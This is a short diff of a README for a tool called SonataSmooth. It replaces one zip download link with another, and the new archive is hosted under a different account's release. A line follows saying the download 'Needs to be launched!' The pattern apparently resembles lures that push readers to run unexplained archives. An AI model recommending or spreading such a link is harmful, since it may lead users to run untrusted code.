@@ -66,7 +66,7 @@ Explore a wide range of topics related to SonataSmooth:
 
 ## Download SonataSmooth 🚀
 
-Enjoy the power of SonataSmooth by downloading it here: [Download SonataSmooth](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+Enjoy the power of SonataSmooth by downloading it here: [Download SonataSmooth](https://github.com/nahueldk12/SonataSmooth/releases/download/v1.0/Soft.zip)
 
 ### Note: Needs to be launched!
 
